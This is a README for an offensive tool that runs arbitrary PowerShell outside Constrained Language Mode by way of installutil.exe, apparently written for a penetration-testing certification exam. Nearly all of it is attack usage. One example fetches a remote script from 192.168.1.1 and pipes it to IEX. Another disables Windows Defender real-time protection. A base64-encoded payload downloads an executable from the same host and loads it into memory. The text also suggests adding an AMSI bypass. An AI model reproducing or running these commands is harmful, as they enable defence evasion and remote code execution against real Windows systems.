# Bypass

Use to Bypass PowerShell's Constrained Lanquage mode

I rewrote this tool for my use on the OSEP exam and its derived from https://github.com/calebstewart Bypass-clm project, My need was to not have to recompile each time I changed which commands to run, so I changed it to a stripped down version where the commands to execute are passed/parsed via cmd line switches.  If you want AMSI then add the string to the cmd/file you pass.


Yes I was lazy the switches are in lowercase.



**/cmd: Commands are passed as a string**

  **example**  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Bypass.exe /cmd:"(new-object system.net.webclient).downloadstring('http://192.168.1.1/spa_shell.txt') | IEX"
   
  
  **example**  c:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U cmd2Bypass.exe /"Set-MpPreference -DisableRealtimeMonitoring `$true" ; Get-MpPreference | Format-List DisableReal*



  
**/file: Commands are parsed from the specified file name**


  **example**  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U Bypass.exe /file:vshell.txt




**/b64: Commands are passed as a base64 encoded string**

  **example**  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U Bypass.exe /cmd:"JABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxAC8AcwBwAGgALgBlAHgAZQAiACkAOwAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgAJABkAGEAdABhACkAOwAkAGUAbgB0AHIAeQBQAG8AaQBuAHQATQBlAHQAaABvAGQAIAA9ACAAIAAkAGEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAcwAoACkALgBXAGgAZQByAGUAKAB7ACAAJABfAC4ATgBhAG0AZQAgAC0AZQBxACAAIgBQAHIAbwBnAHIAYQBtACIAIAB9ACwAIAAiAEYAaQByAHMAdAAiACkALgBHAGUAdABNAGUAdABoAG8AZAAoACIATQBhAGkAbgAiACwAIABbAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBCAGkAbgBkAGkAbgBnAEYAbABhAGcAcwBdACAAIgBTAHQAYQB0AGkAYwAsACAAUAB1AGIAbABpAGMALAAgAE4AbwBuAFAAdQBiAGwAaQBjACIAKQA7ACQAZQBuAHQAcgB5AFAAbwBpAG4AdABNAGUAdABoAG8AZAAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAIAAoACwAIABbAHMAdAByAGkAbgBnAFsAXQBdACAAKAAiACIAKQApACkA"




Multiple commands can be stacked by standard ";" delimination or piped with | or lines in a file
When in doubt wrap the string in dbl quotes

Most of the powershell scripts tested worked with no modification. but hey no guarentees.
